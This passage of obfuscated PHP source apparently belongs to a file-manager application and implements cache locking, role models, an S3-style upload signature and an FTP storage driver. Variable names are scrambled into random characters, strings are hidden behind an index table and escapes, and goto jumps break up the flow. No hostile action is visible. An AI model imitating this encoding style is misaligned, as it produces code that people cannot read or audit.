$†ö´Îí× =& $_SERVER[ñ÷§¡å]; $õĞƒ’ƒÅ = self::init(); $‡¥¬÷­õ = self::key($Ó¶İò…); $êéæş» = $êéæş» ? $êéæş» : self::$timeout; $Ôì©Ç˜ = $õĞƒ’ƒÅ->lock($‡¥¬÷­õ, $êéæş»); $óÀığßƒ = timeFloat(); if (!$Ôì©Ç˜) { $­éë¤­Ğ = "\x6c\157\x63\153\x20\x65\162\x72\157\162\x3b\153\x65\x79\75{$Ó¶İò…}\x3b\164\x69\155\145\75{$êéæş»}\x3b" . self::$errorMsg . $†ö´Îí×[81] . get_caller_msg(); $Ä†Øñë‘ = LNG($†ö´Îí×[858]) . "\x28{$êéæş»}\163\51\x2e" . LNG($†ö´Îí×[859]); $Ä†Øñë‘ .= $†ö´Îí×[860]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ä†Øñë‘ = $Ä†Øñë‘ . $†ö´Îí×[861] . self::$errorMsg; } write_log($­éë¤­Ğ, $†ö´Îí×[856]); show_json($Ä†Øñë‘, !1); } if (!$à †Ç½Ã) { self::$lockItem[$‡¥¬÷­õ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¾¤ŠöÌü = number_format(timeFloat() - $óÀığßƒ, 3); write_log($†ö´Îí×[862] . $Ó¶İò… . $†ö´Îí×[863] . $¾¤ŠöÌü, $†ö´Îí×[856]); } return $Ôì©Ç˜; } public static function lockGet($ò×î‡›½) { $ãôê¸™ = self::key($ò×î‡›½); if (self::$lockItem[$ãôê¸™]) { return self::$lockItem[$ãôê¸™]; } return self::init()->lockGet($ãôê¸™); } public static function unlock($Şåä²™) { $¬—Á¾Ø =& $_SERVER[ñ÷§¡å]; $Ú«åŒï = self::key($Şåä²™); self::$lockItem[$Ú«åŒï] = null; self::init()->unlock($Ú«åŒï); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¬—Á¾Ø[864] . $Şåä²™, $¬—Á¾Ø[856]); } return; } public static function unlockRuntime() { $–Î‹ùÄÍ =& $_SERVER[ñ÷§¡å]; $Âë¦º³ç = self::init(); $Øğ€Şáí = !1; foreach (self::$lockItem as $É³³ĞšÉ => $ƒÚÆ“) { if (!$ƒÚÆ“) { continue; } $Âë¦º³ç->unlock($É³³ĞšÉ); if (!$Øğ€Şáí) { $Øğ€Şáí = !0; write_log($–Î‹ùÄÍ[865] . $É³³ĞšÉ . $–Î‹ùÄÍ[81] . get_caller_msg(), $–Î‹ùÄÍ[856]); continue; } write_log($–Î‹ùÄÍ[865] . $É³³ĞšÉ, $–Î‹ùÄÍ[856]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $†Á¾‘øÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($–Î‹ùÄÍ[866] . $†Á¾‘øÉ . $–Î‹ùÄÍ[867] . ACTION, $–Î‹ùÄÍ[856]); } } public static function fileLock($‚Ğƒ“ã) { $áÈúÙÜ =& $_SERVER[ñ÷§¡å]; if (!$GLOBALS[$áÈúÙÜ[868]]) { $GLOBALS[$áÈúÙÜ[868]] = array(); } $GLOBALS[$áÈúÙÜ[868]][$‚Ğƒ“ã] = !1; $´ÙÚ—ç = fopen(DATA_PATH . $‚Ğƒ“ã . $áÈúÙÜ[869], $áÈúÙÜ[870]); if (!$´ÙÚ—ç) { return !1; } $GLOBALS[$áÈúÙÜ[868]][$‚Ğƒ“ã] = $´ÙÚ—ç; if (flock($´ÙÚ—ç, LOCK_EX)) { return !0; } self::unlock($‚Ğƒ“ã); show_json($áÈúÙÜ[871], !1); return !1; } public static function fileUnlock($˜ìøÁ’‰) { $ß²½³«Ê =& $_SERVER[ñ÷§¡å]; $£½¬‹İˆ = $GLOBALS[$ß²½³«Ê[868]][$˜ìøÁ’‰]; if (!$£½¬‹İˆ) { return; } $GLOBALS[$ß²½³«Ê[868]][$˜ìøÁ’‰] = !1; flock($£½¬‹İˆ, LOCK_UN); fclose($£½¬‹İˆ); } public static function fileUnlockAll() { $Øúµ´¹ì =& $_SERVER[ñ÷§¡å]; if (!$GLOBALS[$Øúµ´¹ì[868]]) { return; } foreach ($GLOBALS[$Øúµ´¹ì[868]] as $¨é·ÆªÎ => $”¥§¨) { if (!$”¥§¨) { continue; } $GLOBALS[$Øúµ´¹ì[868]][$¨é·ÆªÎ] = !1; flock($”¥§¨, LOCK_UN); fclose($”¥§¨); } $GLOBALS[$Øúµ´¹ì[868]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¢Ÿ•İ =& $_SERVER[ñ÷§¡å]; $Ü÷¶Ï’ê = $GLOBALS[$¢Ÿ•İ[6]][$¢Ÿ•İ[358]]; self::$cachePath = $Ü÷¶Ï’ê[$¢Ÿ•İ[209]][$¢Ÿ•İ[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ËîéŠ±, $·ƒ£ = 0) { $àÛš†¹€ =& $_SERVER[ñ÷§¡å]; $ÈŠ¥å¥ª = microtime(!0); $åîÕËÀ´ = $ÈŠ¥å¥ª + $·ƒ£ + 0.0001; $Ì“ı¸«ä = rtrim(self::$cachePath, $àÛš†¹€[8]) . $àÛš†¹€[872] . md5($ËîéŠ±) . $àÛš†¹€[869]; if (file_exists($Ì“ı¸«ä) && filemtime($Ì“ı¸«ä) && filemtime($Ì“ı¸«ä) < time() - 10) { @unlink($Ì“ı¸«ä); } do { if (file_exists($Ì“ı¸«ä)) { cacheLockWait(); continue; } $Ú‹ÅÎ¶ñ = fopen($Ì“ı¸«ä, $àÛš†¹€[873]); if (!$Ú‹ÅÎ¶ñ) { return !1; } $òç¾¨ç = flock($Ú‹ÅÎ¶ñ, LOCK_EX | LOCK_NB); self::$caches[$ËîéŠ±] = array($àÛš†¹€[874] => $Ú‹ÅÎ¶ñ, $àÛš†¹€[209] => $Ì“ı¸«ä); fwrite($Ú‹ÅÎ¶ñ, $åîÕËÀ´); clearstatcache(); if ($Ú‹ÅÎ¶ñ && $òç¾¨ç) { return !0; } cacheLockWait(); } while (microtime(!0) < $åîÕËÀ´); $this->unlock($ËîéŠ±); return !1; } public function lockGet($³ÇéÌ †) { $ØÖ Å· =& $_SERVER[ñ÷§¡å]; $˜§¯çùø = rtrim(self::$cachePath, $ØÖ Å·[8]) . $ØÖ Å·[872] . md5($³ÇéÌ †) . $ØÖ Å·[869]; return file_exists($˜§¯çùø); } public function unlock($¡³ğÖÄ) { $ŸìùºÎ =& $_SERVER[ñ÷§¡å]; $°¹£¦›É = self::$caches[$¡³ğÖÄ]; if (!$°¹£¦›É) { return; } @flock($°¹£¦›É[$ŸìùºÎ[874]], LOCK_UN); @fclose($°¹£¦›É[$ŸìùºÎ[874]]); @unlink($°¹£¦›É[$ŸìùºÎ[209]]); unset(self::$caches[$¡³ğÖÄ]); } } goto cÑƒâôÇ‡µ; Bê˜¶àÀ«: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\137\x6f\x70\164\151\157\156"; protected $jsonField = array("\155\145\156\165", "\162\x6f\154\145", "\x72\157\154\x65\x47\162\x6f\x75\160", "\x72\145\x67\x69\x73\x74", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ëÏ€Ùõ) { return "\x53\x79\163\164\x65\x6d\x4f\160\x74\x69\x6f\156\x5f{$ëÏ€Ùõ}"; } protected function optionDefault($—ÓÔÀØß = '') { $óÑ¨Ãä´ =& $_SERVER[ñ÷§¡å]; if ($—ÓÔÀØß == $óÑ¨Ãä´[12]) { return $GLOBALS[$óÑ¨Ãä´[6]][$óÑ¨Ãä´[390]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x72\157\x6c\145\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\x61\165\x74\150", "\154\x61\142\145\154", "\144\151\163\x70\x6c\141\x79", "\163\171\163\164\x65\155", "\144\x65\x73\x63", "\151\147\156\x6f\162\x65\105\170\164", "\x69\x67\156\x6f\162\x65\x46\151\154\145\123\151\x7a\x65", "\141\144\x6d\151\x6e\151\x73\164\x72\x61\x74\157\x72", "\163\x6f\x72\x74"); public function listData($…×˜Ûş = false, $ı‚ûû¯È = "\163\x6f\x72\x74", $øç·˜Ü = false) { $÷ñÊÎÈ“ =& $_SERVER[ñ÷§¡å]; $³¾ŸËñ€ = parent::listData($…×˜Ûş, $ı‚ûû¯È, $øç·˜Ü); if (!$…×˜Ûş) { foreach ($³¾ŸËñ€ as $şü··ùï => $ÂƒÒ©Ü¨) { if ($ÂƒÒ©Ü¨[$÷ñÊÎÈ“[2033]] == 1) { $³¾ŸËñ€[$şü··ùï][$÷ñÊÎÈ“[462]] = LNG($÷ñÊÎÈ“[2267]); } } } return $³¾ŸËñ€; } public function update($©øêù¿À, $Âê è´Ê) { $ÈÌ…»¦È =& $_SERVER[ñ÷§¡å]; $š¥Ëôƒİ = parent::listData($©øêù¿À); $Û§ĞŸ¿ã = $this->findByName($Âê è´Ê[$ÈÌ…»¦È[32]]); if (!$š¥Ëôƒİ || $Û§ĞŸ¿ã && $Û§ĞŸ¿ã[$ÈÌ…»¦È[408]] != $š¥Ëôƒİ[$ÈÌ…»¦È[408]]) { return !1; } if ($Û§ĞŸ¿ã[$ÈÌ…»¦È[2033]] == 1) { $Âê è´Ê = array($ÈÌ…»¦È[32] => $Âê è´Ê[$ÈÌ…»¦È[32]], $ÈÌ…»¦È[1858] => $Âê è´Ê[$ÈÌ…»¦È[1858]]); } $this->filterAuth($Âê è´Ê[$ÈÌ…»¦È[422]]); return parent::update($©øêù¿À, $Âê è´Ê); } public function remove($á‘¢Ğ) { $“¦—‹ğ = parent::listData($á‘¢Ğ); if (!$“¦—‹ğ || $“¦—‹ğ[$_SERVER[ñ÷§¡å][1283]]) { return !1; } return parent::remove($á‘¢Ğ); } public function add($ Çæ‰í®) { $ŠâÆÓ²¾ =& $_SERVER[ñ÷§¡å]; $ß±í…å = $ Çæ‰í®[$ŠâÆÓ²¾[32]]; if ($this->findByName($ß±í…å)) { return !1; } $Ëº§¸Ï¸ = array($ŠâÆÓ²¾[429] => $ß±í…å, $ŠâÆÓ²¾[1841] => $ŠâÆÓ²¾[12], $ŠâÆÓ²¾[1837] => $ŠâÆÓ²¾[1845], $ŠâÆÓ²¾[2268] => 1, $ŠâÆÓ²¾[1840] => 0, $ŠâÆÓ²¾[2269] => 0, $ŠâÆÓ²¾[1839] => $this->getSort()); $ Çæ‰í® = array_merge($Ëº§¸Ï¸, $ Çæ‰í®); $this->filterAuth($ Çæ‰í®[$ŠâÆÓ²¾[422]]); return parent::insert($ Çæ‰í®); } private function getSort() { $ËŒ§ºÕ² =& $_SERVER[ñ÷§¡å]; $Ç®ÆÎ×Ò = parent::listData(); $Å€‰‚ÜÉ = array_to_keyvalue($Ç®ÆÎ×Ò, $ËŒ§ºÕ²[12], $ËŒ§ºÕ²[1859]); return empty($Å€‰‚ÜÉ) ? 0 : max($Å€‰‚ÜÉ) + 1; } private function filterAuth(&$Ø…¬Æè) { $Û´ª¦¯û =& $_SERVER[ñ÷§¡å]; $»¬€ç˜ = array(); $’ö†Êº = array_filter(explode($Û´ª¦¯û[50], $Ø…¬Æè)); foreach ($’ö†Êº as $Ø…¬Æè) { $’§İàõø = explode($Û´ª¦¯û[10], $Ø…¬Æè); if ($’§İàõø[0] == $Û´ª¦¯û[2270] && $’§İàõø[1] != $Û´ª¦¯û[1202]) { $¢ææ¸ÔÏ = $’§İàõø[0] . $Û´ª¦¯û[10] . $’§İàõø[1] . $Û´ª¦¯û[2271]; if (!in_array($¢ææ¸ÔÏ, $’ö†Êº)) { $»¬€ç˜[] = $¢ææ¸ÔÏ; } } $»¬€ç˜[] = $Ø…¬Æè; } $Ø…¬Æè = implode($Û´ª¦¯û[50], $»¬€ç˜); } public function findRoleDefault() { $‘’ ®á¤ =& $_SERVER[ñ÷§¡å]; $³®ÎÌòØ = parent::listData(); $ò²„©† = !1; foreach ($³®ÎÌòØ as $¼«°) { if (!$¼«° || $¼«°[$‘’ ®á¤[1857]] == $‘’ ®á¤[207] || $¼«°[$‘’ ®á¤[2033]] == 1) { continue; } if (strstr($¼«°[$‘’ ®á¤[422]], $‘’ ®á¤[2272])) { continue; } if (!strstr($¼«°[$‘’ ®á¤[422]], $‘’ ®á¤[2273])) { continue; } if (!$ò²„©†) { $ò²„©† = $¼«°; continue; } $õÚœÖÚ¯ = explode($‘’ ®á¤[50], $ò²„©†[$‘’ ®á¤[422]]); $›ö·Á ò = explode($‘’ ®á¤[50], $¼«°[$‘’ ®á¤[422]]); if (count($õÚœÖÚ¯) > count($›ö·Á ò)) { $ò²„©† = $¼«°; } } return $ò²„©† ? $ò²„©†[$‘’ ®á¤[408]] : $‘’ ®á¤[12]; } public function sort($–¾ˆß®ë, $åÛŒ¼ÜÏ) { return parent::update($–¾ˆß®ë, $åÛŒ¼ÜÏ); } } goto e“­Œà‡›¢; C×ïá¿ãŠä: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Î´èâº) { parent::__construct($Î´èâº); $this->signatureVersion($_SERVER[ñ÷§¡å][226]); } public function uploadFormData($·‚í‰, $Ú»ìú¶ = 3600) { $Ù·ö¨Ü× =& $_SERVER[ñ÷§¡å]; $©á•ÃÓ = $Ù·ö¨Ü×[208]; $½˜Ú¡¸ç = $Ù·ö¨Ü×[1353]; $¾ğŠÑíì = $Ù·ö¨Ü×[72]; $á…îËô¸ = gmdate($Ù·ö¨Ü×[1354]); $Õ á¶Çø = gmdate($Ù·ö¨Ü×[764]); $ŸìÁ„Áå = $Ù·ö¨Ü×[1355]; $×„€×° = $Ú»ìú¶ . $Ù·ö¨Ü×[12]; $Àè¸˜ş = $Ù·ö¨Ü×[1317]; $ÖâúÈ±Ÿ = array($this->accessKey, $Õ á¶Çø, $this->region, $¾ğŠÑíì, $ŸìÁ„Áå); $‚ëÃßª· = implode($Ù·ö¨Ü×[8], $ÖâúÈ±Ÿ); $„Èø¢„´ = array($Ù·ö¨Ü×[1319] => gmdate($Ù·ö¨Ü×[1318], strtotime($Ù·ö¨Ü×[1356])), $Ù·ö¨Ü×[1320] => array(array($Ù·ö¨Ü×[1322] => $this->bucket), array($Ù·ö¨Ü×[1321] => $©á•ÃÓ), array($Ù·ö¨Ü×[1323], $Ù·ö¨Ü×[1324], $Ù·ö¨Ü×[12]), array($Ù·ö¨Ü×[1323], $Ù·ö¨Ü×[1357], $Ù·ö¨Ü×[12]), array($Ù·ö¨Ü×[1323], $Ù·ö¨Ü×[1358], $Ù·ö¨Ü×[12]), array($Ù·ö¨Ü×[1325] => $Àè¸˜ş), array($Ù·ö¨Ü×[1359] => $‚ëÃßª·), array($Ù·ö¨Ü×[1360] => $½˜Ú¡¸ç), array($Ù·ö¨Ü×[1361] => $á…îËô¸), array($Ù·ö¨Ü×[1362] => $×„€×°))); $¿Æ‰Ôèâ = base64_encode(json_encode($„Èø¢„´)); $¥°‹ü = hash_hmac($Ù·ö¨Ü×[1363], $Õ á¶Çø, $Ù·ö¨Ü×[1364] . $this->secret, !0); $á—¤¹å¿ = hash_hmac($Ù·ö¨Ü×[1363], $this->region, $¥°‹ü, !0); $ËÂ¶ºòÕ = hash_hmac($Ù·ö¨Ü×[1363], $¾ğŠÑíì, $á—¤¹å¿, !0); $¼©³ÔÌö = hash_hmac($Ù·ö¨Ü×[1363], $ŸìÁ„Áå, $ËÂ¶ºòÕ, !0); $ĞÊ˜·û¨ = hash_hmac($Ù·ö¨Ü×[1363], $¿Æ‰Ôèâ, $¼©³ÔÌö); $—ŞÑ˜  = array($Ù·ö¨Ü×[225] => $Ù·ö¨Ü×[12], $Ù·ö¨Ü×[1365] => $Ù·ö¨Ü×[12], $Ù·ö¨Ü×[1321] => $©á•ÃÓ, $Ù·ö¨Ü×[1325] => $Àè¸˜ş, $Ù·ö¨Ü×[1329] => $¿Æ‰Ôèâ, $Ù·ö¨Ü×[1366] => $‚ëÃßª·, $Ù·ö¨Ü×[1367] => $½˜Ú¡¸ç, $Ù·ö¨Ü×[1368] => $á…îËô¸, $Ù·ö¨Ü×[1369] => $×„€×°, $Ù·ö¨Ü×[1370] => $ĞÊ˜·û¨, $Ù·ö¨Ü×[191] => $this->getHost()); return $—ŞÑ˜ ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($Õ«ôÜ®…) { parent::__construct(); if (count($Õ«ôÜ®…) > 0) { $this->_init($Õ«ôÜ®…); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($äÙÙ…œ) { $‹¦¥©± =& $_SERVER[ñ÷§¡å]; global $config; $this->appCharset = $config[$‹¦¥©±[1371]]; $this->systemCharset = $config[$‹¦¥©±[1372]]; if (isset($äÙÙ…œ[$‹¦¥©±[1373]]) && $äÙÙ…œ[$‹¦¥©±[1373]]) { $this->systemCharset = $äÙÙ…œ[$‹¦¥©±[1373]]; } } public function iconvApp($âƒŠÍë´) { return $this->iconvTo($âƒŠÍë´, $this->systemCharset, $this->appCharset); } public function iconvSystem($ó™•€„Û) { return $this->iconvTo($ó™•€„Û, $this->appCharset, $this->systemCharset); } public function getPathOuter($ûúÏç) { $„§ª§ =& $_SERVER[ñ÷§¡å]; $°È¡˜£ = $this->iconvApp($this->pathBase); $ûúÏç = $this->iconvApp($ûúÏç); if (substr($°È¡˜£, 0, 2) == $„§ª§[1374]) { $°È¡˜£ = BASIC_PATH . substr($°È¡˜£, 2); } if (substr($ûúÏç, 0, 2) == $„§ª§[1374]) { $ûúÏç = BASIC_PATH . substr($ûúÏç, 2); } $°È¡˜£ = KodIO::clear($°È¡˜£); $ûúÏç = KodIO::clear($ûúÏç); $ûúÏç = substr($ûúÏç, strlen($°È¡˜£)); if (empty($this->pathDriver)) { return $ûúÏç; } return $this->pathDriver . $„§ª§[8] . ltrim($ûúÏç, $„§ª§[8]); } private function _init($¥Ø£‘ŒÁ = array()) { $ÙßÖëæ¿ =& $_SERVER[ñ÷§¡å]; if (!function_exists($ÙßÖëæ¿[1375])) { throw new Exception(LNG($ÙßÖëæ¿[1376])); } $this->config = $¥Ø£‘ŒÁ; $this->charsetReset($¥Ø£‘ŒÁ); foreach ($¥Ø£‘ŒÁ as $ş§ÒÎ©Œ => $¿½ÕÛ×) { if (isset($this->{$ş§ÒÎ©Œ})) { $this->{$ş§ÒÎ©Œ} = $¿½ÕÛ×; } } return $this->_login($¥Ø£‘ŒÁ); } private function _login($ŠÙ–Éô) { $ÚÅï×§ª =& $_SERVER[ñ÷§¡å]; static $©¶ˆ¼Ûè = array(); $õ¾ÉÚµœ = md5(json_encode($ŠÙ–Éô)); if (isset($©¶ˆ¼Ûè[$õ¾ÉÚµœ])) { foreach ($©¶ˆ¼Ûè[$õ¾ÉÚµœ] as $è«Ú×é => $‚É´àÖ¼) { $this->{$è«Ú×é} = $‚É´àÖ¼; } return !0; } $ôÕ­äçÚ = parse_url(trim($this->server, $ÚÅï×§ª[8])); $this->host = $ôÕ­äçÚ[$ÚÅï×§ª[191]]; $›¤ßšŞ¸ = isset($ôÕ­äçÚ[$ÚÅï×§ª[190]]) && $ôÕ­äçÚ[$ÚÅï×§ª[190]] == $ÚÅï×§ª[1377] ? !0 : !1; $this->scheme = $›¤ßšŞ¸ ? $ÚÅï×§ª[1378] : $ÚÅï×§ª[1379]; $this->port = isset($ôÕ­äçÚ[$ÚÅï×§ª[192]]) ? $ôÕ­äçÚ[$ÚÅï×§ª[192]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $î‹€áã = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ğ êÄÈÛ = $this->pasv == $ÚÅï×§ª[98] ? !0 : !1; @ftp_pasv($this->connect, $Ğ êÄÈÛ); $©¶ˆ¼Ûè[$õ¾ÉÚµœ] = array($ÚÅï×§ª[1380] => $this->connect, $ÚÅï×§ª[191] => $this->host, $ÚÅï×§ª[190] => $this->scheme, $ÚÅï×§ª[192] => $this->port); return $î‹€áã; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ì“Å×Â‹, $”ô÷ƒ—Ä = '', $ãÔÎÛ”® = REPEAT_RENAME) { if ($this->setContent($Ì“Å×Â‹, $”ô÷ƒ—Ä)) { return $this->getPathOuter($Ì“Å×Â‹); } return !1; } public function mkdir($¥·ıùƒ£, $èŒ¨ÅÂ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¥·ıùƒ£ = $this->iconvSystem($¥·ıùƒ£); if ($this->_isFolder($¥·ıùƒ£) || @ftp_mkdir($this->connect, $¥·ıùƒ£)) { return $this->getPathOuter($¥·ıùƒ£); } if (!$this->mkdir($this->pathFather($¥·ıùƒ£))) { return !1; } if ($¥·ıùƒ£ = @ftp_mkdir($this->connect, $¥·ıùƒ£)) { return $this->getPathOuter($¥·ıùƒ£); } return !1; } public function copyFile($›¡­‚Ø¶, $—Ìá¥ü´) { if (!$this->_isconn()) { return !1; } $ÃÑ‰º§Ë = $this->pathThis($this->iconvSystem($›¡­‚Ø¶)); $é™í÷ù = $this->tempFile($ÃÑ‰º§Ë); $¶‚²÷Åõ = $this->iconvApp($é™í÷ù); $this->download($›¡­‚Ø¶, $¶‚²÷Åõ); $êœíåÛ = $this->upload($—Ìá¥ü´, $¶‚²÷Åõ); $this->tempFileRemve($é™í÷ù); return $êœíåÛ; } public function moveFile($ö™ÈÓ¨¹, $¦÷ù ¸Ñ) { if (!$this->_isconn()) { return !1; } $ö™ÈÓ¨¹ = $this->iconvSystem($ö™ÈÓ¨¹); $¦÷ù ¸Ñ = $this->iconvSystem($¦÷ù ¸Ñ); $Ù»ÓŒÄ® = @ftp_rename($this->connect, $ö™ÈÓ¨¹, $¦÷ù ¸Ñ); return $Ù»ÓŒÄ® ? $this->getPathOuter($¦÷ù ¸Ñ) : !1; } public function delFile($‰”ñÍ–) { if (!$this->_isconn()) { return !1; } $‰”ñÍ– = $this->iconvSystem($‰”ñÍ–); return @ftp_delete($this->connect, $‰”ñÍ–); } public function delFolder($‘ğš—ÜÁ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ŠØÊÒØŒ = $¾©İŠÒì = array(); $this->fileList($‘ğš—ÜÁ, $ŠØÊÒØŒ, $¾©İŠÒì, !0); $this->listItemCache = !0; foreach ($¾©İŠÒì as $ù‡§¸«°) { $Ãä“ØÏ¦ = $this->iconvSystem($ù‡§¸«°[$_SERVER[ñ÷§¡å][32]]); $¼®à–§Ã = @ftp_delete($this->connect, $Ãä“ØÏ¦); if (!$¼®à–§Ã) { return !1; } } foreach ($ŠØÊÒØŒ as $Ãä“ØÏ¦) { $Ãä“ØÏ¦ = $this->iconvSystem($Ãä“ØÏ¦); $¼®à–§Ã = @ftp_rmdir($this->connect, $Ãä“ØÏ¦); if (!$¼®à–§Ã) { return !1; } } $‘ğš—ÜÁ = $this->iconvSystem($‘ğš—ÜÁ); return @ftp_rmdir($this->connect, $‘ğš—ÜÁ); } public function rename($†ã…ƒıÌ, $õá¿ÊÍ¤) { $İÇãšº™ =& $_SERVER[ñ÷§¡å]; if (!$this->_isconn()) { return !1; } $¬È©‹âõ = $this->fileNameAuto($this->pathFather($†ã…ƒıÌ), $õá¿ÊÍ¤); $¬È©‹âõ = $this->iconvSystem($¬È©‹âõ); $†ã…ƒıÌ = $this->iconvSystem($†ã…ƒıÌ); $²ÕÜ«çµ = $this->pathFather($†ã…ƒıÌ); $—½ãÈ¶• = rtrim($²ÕÜ«çµ, $İÇãšº™[8]) . $İÇãšº™[8] . $¬È©‹âõ; $ÃéóŞŸ = @ftp_rename($this->connect, $†ã…ƒıÌ, $—½ãÈ¶•); $—½ãÈ¶• = $this->iconvApp($—½ãÈ¶•); return $ÃéóŞŸ ? $this->getPathOuter($—½ãÈ¶•) : !1; } private function folderInfo($Œà„âîÂ, $àÌšÀå‡ = false) { $ƒÍí®î =& $_SERVER[ñ÷§¡å]; $º‰¢Òœ = array($ƒÍí®î[32] => $this->pathThis($Œà„âîÂ), $ƒÍí®î[94] => $this->getPathOuter($ƒÍí®î[8] . $Œà„âîÂ), $ƒÍí®î[33] => $ƒÍí®î[85]); if ($àÌšÀå‡) { return $º‰¢Òœ; } $º‰¢Òœ[$ƒÍí®î[210]] = $º‰¢Òœ[$ƒÍí®î[95]] = 0; $º‰¢Òœ[$ƒÍí®î[211]] = $º‰¢Òœ[$ƒÍí®î[212]] = !0; return $º‰¢Òœ; } private function fileInfo($óõ½›äû, $ŒçÇµ‰ = false, $âˆú¥á¤ = array()) { $µ½›­Ãè =& $_SERVER[ñ÷§¡å]; $ÄĞãÓÛ¸ = array($µ½›­Ãè[32] => $this->pathThis($óõ½›äû), $µ½›­Ãè[94] => $this->getPathOuter($µ½›­Ãè[8] . $óõ½›äû), $µ½›­Ãè[33] => $µ½›­Ãè[209], $µ½›­Ãè[86] => isset($âˆú¥á¤[$µ½›­Ãè[86]]) ? $âˆú¥á¤[$µ½›­Ãè[86]] : 0, $µ½›­Ãè[184] => $this->ext($óõ½›äû)); if ($ŒçÇµ‰) { return $ÄĞãÓÛ¸; } $ÄĞãÓÛ¸[$µ½›­Ãè[210]] = $ÄĞãÓÛ¸[$µ½›­Ãè[95]] = 0; $ÄĞãÓÛ¸[$µ½›­Ãè[211]] = $ÄĞãÓÛ¸[$µ½›­Ãè[212]] = !0; $÷€‡²  = $this->iconvSystem($óõ½›äû); $ÄĞãÓÛ¸[$µ½›­Ãè[95]] = @ftp_mdtm($this->connect, $÷€‡² ); if (empty($âˆú¥á¤)) { $âˆú¥á¤ = $this->objectMeta($óõ½›äû); if (!$âˆú¥á¤) { return $ÄĞãÓÛ¸; } } $ÄĞãÓÛ¸[$µ½›­Ãè[86]] = $âˆú¥á¤[$µ½›­Ãè[86]]; return $ÄĞãÓÛ¸; } public function size($õ¶ñ‰Ï) { $ûÏòà— = $this->objectMeta($õ¶ñ‰Ï); return $ûÏòà— ? $ûÏòà—[$_SERVER[ñ÷§¡å][86]] : 0; } public function info($ºŸ’¦) { if ($this->isFile($ºŸ’¦)) { return $this->fileInfo($ºŸ’¦, 0); } else { if ($this->isFolder($ºŸ’¦)) { return $this->folderInfo($ºŸ’¦); } } return !1; } private function fileList($™º´Ãˆ‰, &$Ğ³©Ÿ²Î, &$º¹™âÏĞ, $ÁÑšõ‰ = false) { $…ÔÏØ¢ç =& $_SERVER[ñ÷§¡å]; $™º´Ãˆ‰ = $this->iconvSystem($™º´Ãˆ‰); if (!$this->isFolder($™º´Ãˆ‰)) { return !1; } @ftp_chdir($this->connect, $…ÔÏØ¢ç[8]); $™º´Ãˆ‰ = rtrim($™º´Ãˆ‰, $…ÔÏØ¢ç[8]) . $…ÔÏØ¢ç[8]; check_abort(); $ê™«¨„ = @ftp_rawlist($this->connect, $™º´Ãˆ‰); if (!$ê™«¨„) { $ê™«¨„ = array(); } $Óó¾„å£ = array($…ÔÏØ¢ç[10] => 1, $…ÔÏØ¢ç[1381] => 1); foreach ($ê™«¨„ as $Ğá‹Ï») { $§»Ì¾Àî = $this->_listItem($Ğá‹Ï»); if ($§»Ì¾Àî[0] == $…ÔÏØ¢ç[772]) { continue; } $ĞÈ¥åšç = $§»Ì¾Àî[8]; if (empty($ĞÈ¥åšç) && $ĞÈ¥åšç !== $…ÔÏØ¢ç[207] || isset($Óó¾„å£[$ĞÈ¥åšç])) { continue; } $ĞÈ¥åšç = $this->iconvApp($™º´Ãˆ‰ . ltrim($ĞÈ¥åšç, $…ÔÏØ¢ç[8])); $Èõ–ÜÈ = array($…ÔÏØ¢ç[32] => $ĞÈ¥åšç, $…ÔÏØ¢ç[33] => $…ÔÏØ¢ç[209], $…ÔÏØ¢ç[86] => $§»Ì¾Àî[4]); if (substr($Ğá‹Ï», 0, 1) == $…ÔÏØ¢ç[1382]) { $Èõ–ÜÈ[$…ÔÏØ¢ç[33]] = $…ÔÏØ¢ç[85]; $Èõ–ÜÈ[$…ÔÏØ¢ç[86]] = 0; } $ÄØâ­°ˆ = $Èõ–ÜÈ[$…ÔÏØ¢ç[33]] == $…ÔÏØ¢ç[85] ? !0 : !1; $this->cacheMethodInfoSet($ĞÈ¥åšç, $ÄØâ­°ˆ, $Èõ–ÜÈ); if ($ÄØâ­°ˆ) { $Ğ³©Ÿ²Î[] = $ĞÈ¥åšç; if ($ÁÑšõ‰) { $this->fileList($ĞÈ¥åšç, $Ğ³©Ÿ²Î, $º¹™âÏĞ, $ÁÑšõ‰); } continue; } $º¹™âÏĞ[] = $Èõ–ÜÈ; } $this->cacheMethodInfoSet($™º´Ãˆ‰, !0); } private function _listItem($ÊËµƒÄÁ) { if (empty($ÊËµƒÄÁ)) { return array(); } $òª´¹Á„ = preg_split($_SERVER[ñ÷§¡å][1383], $ÊËµƒÄÁ); if (count($òª´¹Á„) <= 9) { return $òª´¹Á„; } $òª´¹Á„[8] = trim(substr($ÊËµƒÄÁ, strpos($ÊËµƒÄÁ, $òª´¹Á„[7]) + strlen($òª´¹Á„[7]))); return array_splice($òª´¹Á„, 0, 9); } public function listPath($§˜Æ†Î, $ïòœ¾² = false) { $†Å—¢Ï =& $_SERVER[ñ÷§¡å]; if (!$this->_isconn()) { return !1; } $­ãœúÒí = $”í÷†— = array(); $this->fileList($§˜Æ†Î, $­ãœúÒí, $”í÷†—); foreach ($­ãœúÒí as $¿¬ÊÕâ => 